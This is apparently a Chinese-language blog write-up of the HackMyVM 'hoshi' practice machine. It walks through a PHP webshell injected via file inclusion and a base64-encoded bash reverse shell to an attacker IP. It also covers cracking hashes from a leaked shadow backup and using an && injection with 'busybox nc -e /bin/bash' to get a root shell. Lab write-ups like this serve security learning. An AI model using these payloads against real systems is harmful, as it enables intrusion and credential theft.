src="/2025/06/23/HackMyVM-hoshi/vmware_LG5Xc5SpwO.png"></p><p><img src="/2025/06/23/HackMyVM-hoshi/PuzzleSolver_kfan52QR29.png"></p><p>得到一个子目录hoshi&#x2F;。</p><style>.jptjeudhhofs{zoom: 50%;}</style><img src="/2025/06/23/HackMyVM-hoshi/Photos_TQPw6GhFt9.png" class="jptjeudhhofs"><p>访问hoshi&#x2F;，其中有一个gift.php，访问提示非法文件名，猜想可能有文件包含，不过暂时不知道有什么用。</p><p><img src="/2025/06/23/HackMyVM-hoshi/vmware_kT0ZSMYB8Q.png"></p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><hr><p>回到网站首页，底下有个用户反馈功能，结合上面的客服团队三日内解决我以为是有xss，但是试了半天没用，后来找作者要提示才知道没关系，就是普通的密码。</p><p><img src="/2025/06/23/HackMyVM-hoshi/vmware_hSwbcCRkxD.png"></p><p>之后没辙了试了试电话号码，就是这个，进入管理员界面。</p><p>进入之后发现有个文件上传目录，结合作者的提示，xss没用，那可能是直接写马进去，试了几次发现全给过滤了，因为它会把php的小于号和大于号转写成&amp;It;和&amp;gt;，即html编码。</p><p><img src="/2025/06/23/HackMyVM-hoshi/vmware_yPKsnBA5LW-1750666012685-8.png"></p><p>不过发现了用户名不会被转写，马上尝试在用户名中插入php代码。</p><p>但把恶意构造的payload上传后在后台查看，发现代码没有被执行，而且我们的用户名也不见了，是不是也被过滤了呢，和之前的可能不是一种逻辑。（这里又硬控我大半个小时）</p><p><img src="/2025/06/23/HackMyVM-hoshi/vmware_JDxrQxRWLD.png"></p><p>在一通东翻西找包括但不限于看完了info.php之后，终于想起来要看源码了，虽然php页面本身不可见，但至少可以看一看元素，其中有一句话说静态界面已生成。</p><p><img src="/2025/06/23/HackMyVM-hoshi/msedge_5bddHb0PPo.png"></p><p>这就能解释我们刚刚的疑问了，我们现在看到的admin.php根本不是真的php文件，而是刚刚那个登录界面跳转过来的不知道叫什么的htm或者html文件，所以我们注入的代码无法执行。</p><p>dirsearch再扫一遍，这时发现了一个admin.html，访问和admin.php一模一样，就好像hexo的博客一样用框架生成静态的界面。</p><p>很显然这就是真正代码嵌入的地方，那现在就差如何执行了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">[03:14:19] 200 -    2KB - /admin.html <br></code></pre></td></tr></table></figure><p>还记得之前的gift.php吗，现在我们来fuzz一下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">********************************************************<br>* Wfuzz 3.1.0 - The Web Fuzzer                         *<br>********************************************************<br><br>Target: http://192.168.56.121/hoshi/gift.php?FUZZ=index.html<br>Total requests: 207643<br><br>=====================================================================<br>ID           Response   Lines    Word       Chars       Payload<br>=====================================================================<br><br>000000741:   200        0 L      2 W        30 Ch       &quot;file&quot;<br></code></pre></td></tr></table></figure><p>得到参数file。</p><p>利用链很清晰了：用gift.php包含admin.html，执行里面的php代码实现rce。</p><p>但是上传完恶意payload，然后不经过admin.php的中继直接去访问或者包含admin.html，会发现里面什么都没有。</p><p>因为此时的html文件还没有被admin.php解析进去，所以这里的代码实际上是被正统html处理方式注释掉了，必须提前加载admin.php才行。（感谢sublarge大佬指正）</p><p>我们先用phpinfo测试。</p><p><img src="/2025/06/23/HackMyVM-hoshi/vmware_V4E0u3mEwH.png"></p><p>不出所料的被成功执行了。</p><p><img src="/2025/06/23/HackMyVM-hoshi/msedge_oiEEbjwEl8.png"></p><p>之后我们再传一句话木马尝试执行命令。（这里我不知道为什么system不能用了，换了shellexec才成功）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]); <span class="hljs-meta">?&gt;</span> <br>http:<span class="hljs-comment">//192.168.56.121/hoshi/gift.php?file=admin.html</span><br>a=whoami<br></code></pre></td></tr></table></figure><p>执行成功。</p><p><img src="/2025/06/23/HackMyVM-hoshi/msedge_6MnLSaXONg.png"></p><p>之后反弹shell即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=<span class="hljs-built_in">printf</span> KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDQvNDQ0NCAwPiYxKSAm|<span class="hljs-built_in">base64</span> -d|bash<br></code></pre></td></tr></table></figure><p><img src="/2025/06/23/HackMyVM-hoshi/vmware_X1b3zx9rDv.png"></p><h3 id="GetUser"><a href="#GetUser" class="headerlink" title="GetUser"></a>GetUser</h3><hr><p>user提权比拿到webshell要简单很多，先看home中的用户是welcome，得到提权目标，下一步仍然是老方法grep简单粗暴的遍历，不过没成。</p><p>好在作者藏的不算特别隐蔽，到处乱翻找到一个shadow文件，应该是要爆破了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@hoshi:/var$ ls<br>backups  cache  lib  local  lock  log  mail  opt  run  spool  tmp  www<br>www-data@hoshi:/var$ cd backups/<br>www-data@hoshi:/var/backups$ ls<br>apt.extended_states.0  apt.extended_states.1.gz  apt.extended_states.2.gz  apt.extended_states.3.gz  apt.extended_states.4.gz  shadow~<br>www-data@hoshi:/var/backups$ cat shadow~ <br>root:$6$TfSlMzl8/eUh9mY0$wVygBx94VuTMRZq016O3IPG2mn1e.MFz2WKK.pACuy/Sa1dTHqu0vWtbTBrt/Q8dIWGBeYrY90ERemhYElKHv1:20190:0:99999:7:::<br>daemon:*:20166:0:99999:7:::<br>bin:*:20166:0:99999:7:::<br>sys:*:20166:0:99999:7:::<br>sync:*:20166:0:99999:7:::<br>games:*:20166:0:99999:7:::<br>man:*:20166:0:99999:7:::<br>lp:*:20166:0:99999:7:::<br>mail:*:20166:0:99999:7:::<br>news:*:20166:0:99999:7:::<br>uucp:*:20166:0:99999:7:::<br>proxy:*:20166:0:99999:7:::<br>www-data:*:20166:0:99999:7:::<br>backup:*:20166:0:99999:7:::<br>list:*:20166:0:99999:7:::<br>irc:*:20166:0:99999:7:::<br>gnats:*:20166:0:99999:7:::<br>nobody:*:20166:0:99999:7:::<br>_apt:*:20166:0:99999:7:::<br>systemd-timesync:*:20166:0:99999:7:::<br>systemd-network:*:20166:0:99999:7:::<br>systemd-resolve:*:20166:0:99999:7:::<br>systemd-coredump:!!:20166::::::<br>messagebus:*:20166:0:99999:7:::<br>sshd:*:20166:0:99999:7:::<br>welcome:$6$geD2QaGnx/AiHPAb$8ihVmhNA1GIUFbAkCuUp.KzsUuzAztIlrYNbPFoyORE9U9dsf/L13AuCNpqkJSxu0HG4ltlhJFJKU2Y1Gj8Sg.:20259:0:99999:7:::<br><br></code></pre></td></tr></table></figure><p>john爆破得到密码loveme2。</p><p>ssh登上去拿到user。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh welcome@192.168.56.121<br>welcome@192.168.56.121&#x27;s password: <br>Linux hoshi 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64<br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Mon Jun 23 02:29:41 2025 from 192.168.56.104<br>welcome@hoshi:~$ cat user.txt <br>flag&#123;user-73b671a5f913d849d405784a428288dd&#125;<br>welcome@hoshi:~$ <br><br></code></pre></td></tr></table></figure><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><p>sudo -l 查看可执行程序。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">welcome@hoshi:~$ sudo -l<br>Matching Defaults entries for welcome on hoshi:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User welcome may run the following commands on hoshi:<br>    (ALL) NOPASSWD: /usr/bin/python3 /root/12345.py<br>welcome@hoshi:~$ <br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">welcome@hoshi:~$ sudo /usr/bin/python3 /root/12345.py<br>Server listening on port 12345...<br></code></pre></td></tr></table></figure><p>发现开启了一个端口，我们用nc连一下，是个命令执行界面。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc 192.168.56.121 12345      <br><span class="hljs-meta prompt_">conf&gt; </span><span class="language-bash">x</span><br>Unknown command. Type &#x27;help&#x27; for commands.<br><span class="hljs-meta prompt_">conf&gt; </span><span class="language-bash"><span class="hljs-built_in">help</span></span><br>=== Configuration Shell ===<br>?/help          List available commands<br>q/quit          Exit the shell<br>read_config     Read server configuration<br>write_config    Write to server configuration<br>list_files      List files in /opt directory<br>check_status    Check server status<br>exec_cmd        Execute allowed system commands (e.g., whoami, pwd)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">conf&gt; </span><span class="language-bash"></span><br><span class="language-bash"></span><br></code></pre></td></tr></table></figure><p>值得注意的是只能执行白名单中的命令，不过有个list_files，列出&#x2F;opt目录下的文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">conf&gt; </span><span class="language-bash">list_files</span><br>Files in /opt:<br>server.conf<br>server.log<br><br></code></pre></td></tr></table></figure><p>我们再来看一下上述目录下的两个文件，server.conf是空文件，但server.log比较有意思。</p><p>我们用靶机给的命令执行工具执行白名单中的pwd。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">conf&gt; </span><span class="language-bash">exec_cmd <span class="hljs-built_in">pwd</span></span><br>/home/welcome<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[2025-06-23 06:57:22] (&#x27;192.168.56.104&#x27;, 35486): Received: list_files<br>[2025-06-23 06:58:54] (&#x27;192.168.56.104&#x27;, 35486): Received: exec_cmd pwd<br>[2025-06-23 06:58:54] (&#x27;192.168.56.104&#x27;, 35486): Executing command: sh -c &#x27;pwd&#x27;<br></code></pre></td></tr></table></figure><p>发现了这个log文件会记录我们命令执行的命令，同时非常关键的一点是它的命令都是用sh-c来执行的，即可以用分号或者&amp;&amp;来命令注入。</p><p>尝试构造注入，不过这边好像是过滤了一些符号。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">conf&gt; </span><span class="language-bash">exec_cmd <span class="hljs-built_in">pwd</span><span class="hljs-string">&#x27; ; ls &#x27;</span></span><br>Error: Forbidden characters (;|&amp;&lt;&gt;) detected.<br><span class="hljs-meta prompt_">conf&gt; </span><span class="language-bash">exec_cmd <span class="hljs-built_in">pwd</span><span class="hljs-string">&#x27; &amp;&amp; ls&#x27;</span></span><br>/home/welcome<br>user.txt<br></code></pre></td></tr></table></figure><p>成功实现。</p><p>那接下来用busybox反弹shell就可以了（群友的靶机一般都会自带busybox）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">conf&gt; </span><span class="language-bash">exec_cmd <span class="hljs-built_in">pwd</span><span class="hljs-string">&#x27; &amp;&amp; busybox nc 192.168.56.104 4444 -e /bin/bash&#x27;</span></span><br><br>[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.21.128 • 192.168.56.104 • 172.18.0.1 • 172.17.0.1<br>➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)<br>[+] Got reverse shell from hoshi-192.168.56.121-Linux-x86_64 😍 Assigned SessionID &lt;1&gt;<br>[+] Attempting to upgrade shell to PTY...<br>[+] Shell upgraded successfully using /usr/bin/python3! 💪<br>[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 <br>[+] Logging to /root/.penelope/hoshi~192.168.56.121_Linux_x86_64/2025_06_23-07_10_51-343.log 📜<br>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>[+] Got reverse shell from hoshi-192.168.56.121-Linux-x86_64 😍 Assigned SessionID &lt;2&gt;<br>root@hoshi:/home/welcome# <br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@hoshi:/home/welcome# cd /root<br>root@hoshi:~# cat root.txt <br>flag&#123;root-5de923e57adefd6a1fd53a6705ad6486&#125;<br>root@hoshi:~# ls<br>12345.py  congrats.txt  root.txt<br>root@hoshi:~# cat congrats.txt <br>Congratulations, Hacker!<br><br>You&#x27;ve successfully pwned this target machine! 🎉 <br>Your skills are top-notch, and you&#x27;ve earned ultimate bragging rights.<br><br>Keep hacking, keep learning, and check out more challenges at maze-sec.com!<br>See you in the next challenge!<br><br>- Sublarge <br><br>root@hoshi:~# <br><br></code></pre></td></tr></table></figure><p>打的真是累死我了唉，拿webshell花的时间比提权和root加起来都多。</p><p>后附上admin.php的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><code class="hljs php">root@hoshi:/<span class="hljs-keyword">var</span>/www/html<span class="hljs-comment"># cat admin.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;<br>    &lt;title&gt;反馈管理后台 - 星际商城&lt;/title&gt;<br>    &lt;script src=<span class="hljs-string">&quot;https://cdn.tailwindcss.com&quot;</span>&gt;&lt;/script&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            background: linear-<span class="hljs-title function_ invoke__">gradient</span>(<span class="hljs-number">135</span>deg, #<span class="hljs-number">1e3</span>a8a, #<span class="hljs-number">6</span>b21a8);<br>            min-height: <span class="hljs-number">100</span>vh;<br>            margin: <span class="hljs-number">0</span>;<br>            padding-top: <span class="hljs-number">80</span>px;<br>        &#125;<br>        .navbar &#123;<br>            background: <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">17</span>, <span class="hljs-number">24</span>, <span class="hljs-number">39</span>, <span class="hljs-number">0.95</span>);<br>            backdrop-filter: <span class="hljs-title function_ invoke__">blur</span>(<span class="hljs-number">10</span>px);<br>            box-shadow: <span class="hljs-number">0</span> <span class="hljs-number">2</span>px <span class="hljs-number">5</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.2</span>);<br>        &#125;<br>        .glow &#123;<br>            box-shadow: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">15</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">59</span>, <span class="hljs-number">130</span>, <span class="hljs-number">246</span>, <span class="hljs-number">0.5</span>);<br>        &#125;<br>        .error-message &#123;<br>            background: <span class="hljs-comment">#ef4444;</span><br>            color: white;<br>            padding: <span class="hljs-number">1</span>rem;<br>            border-radius: <span class="hljs-number">0.5</span>rem;<br>            text-align: center;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">text</span>-<span class="hljs-title">gray</span>-100 <span class="hljs-title">font</span>-<span class="hljs-title">sans</span>&quot;&gt;</span><br><span class="hljs-class">    &lt;!-- 导航栏 --&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">nav</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">navbar</span> <span class="hljs-title">fixed</span> <span class="hljs-title">top</span>-0 <span class="hljs-title">left</span>-0 <span class="hljs-title">w</span>-<span class="hljs-title">full</span> <span class="hljs-title">z</span>-50&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">container</span> <span class="hljs-title">mx</span>-<span class="hljs-title">auto</span> <span class="hljs-title">px</span>-6 <span class="hljs-title">py</span>-4 <span class="hljs-title">flex</span> <span class="hljs-title">items</span>-<span class="hljs-title">center</span> <span class="hljs-title">justify</span>-<span class="hljs-title">between</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">flex</span> <span class="hljs-title">items</span>-<span class="hljs-title">center</span> <span class="hljs-title">space</span>-<span class="hljs-title">x</span>-4&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">QQ</span>.<span class="hljs-title">png</span>&quot; <span class="hljs-title">alt</span>=&quot;<span class="hljs-title">StarMall</span> <span class="hljs-title">Logo</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">h</span>-10 <span class="hljs-title">w</span>-10 <span class="hljs-title">rounded</span>-<span class="hljs-title">full</span> <span class="hljs-title">glow</span>&quot; <span class="hljs-title">style</span>=&quot;<span class="hljs-title">max</span>-<span class="hljs-title">width</span>:48<span class="hljs-title">px</span>;<span class="hljs-title">max</span>-<span class="hljs-title">height</span>:48<span class="hljs-title">px</span>;&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">h1</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>-2<span class="hljs-title">xl</span> <span class="hljs-title">font</span>-<span class="hljs-title">bold</span> <span class="hljs-title">text</span>-<span class="hljs-title">white</span>&quot;&gt;星际商城 - 管理后台&lt;/<span class="hljs-title">h1</span>&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">space</span>-<span class="hljs-title">x</span>-6&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">index</span>.<span class="hljs-title">php</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>-<span class="hljs-title">gray</span>-300 <span class="hljs-title">hover</span>:<span class="hljs-title">text</span>-<span class="hljs-title">blue</span>-400 <span class="hljs-title">transition</span>&quot;&gt;返回前台&lt;/<span class="hljs-title">a</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">uploads</span>/&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>-<span class="hljs-title">gray</span>-300 <span class="hljs-title">hover</span>:<span class="hljs-title">text</span>-<span class="hljs-title">blue</span>-400 <span class="hljs-title">transition</span>&quot;&gt;反馈档案&lt;/<span class="hljs-title">a</span>&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">nav</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">container</span> <span class="hljs-title">mx</span>-<span class="hljs-title">auto</span> <span class="hljs-title">p</span>-6 <span class="hljs-title">max</span>-<span class="hljs-title">w</span>-4<span class="hljs-title">xl</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">h1</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>-3<span class="hljs-title">xl</span> <span class="hljs-title">font</span>-<span class="hljs-title">semibold</span> <span class="hljs-title">text</span>-<span class="hljs-title">center</span> <span class="hljs-title">mb</span>-8 <span class="hljs-title">text</span>-<span class="hljs-title">white</span> <span class="hljs-title">glow</span>&quot;&gt;反馈管理后台&lt;/<span class="hljs-title">h1</span>&gt;</span><br><span class="hljs-class">        </span><br><span class="hljs-class">        &lt;!-- 登录表单 --&gt;</span><br><span class="hljs-class">        &lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class">        <span class="hljs-title">session_start</span>();</span><br><span class="hljs-class">        $<span class="hljs-title">admin_password</span> = &#x27;400-123-4567&#x27;;</span><br><span class="hljs-class">        <span class="hljs-title">if</span> ($<span class="hljs-title">_SERVER</span>[&quot;<span class="hljs-title">REQUEST_METHOD</span>&quot;] == &quot;<span class="hljs-title">POST</span>&quot; &amp;&amp; <span class="hljs-title">isset</span>($<span class="hljs-title">_POST</span>[&#x27;<span class="hljs-title">password</span>&#x27;])) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-variable">$admin_password</span>) &#123;<br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged_in&#x27;</span>] = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p class=&quot;text-yellow-500 text-center error-message mb-6&quot;&gt;密码错误！&lt;/p&gt;&#x27;</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged_in&#x27;</span>]) || <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged_in&#x27;</span>] !== <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-meta">?&gt;</span><br>        &lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span 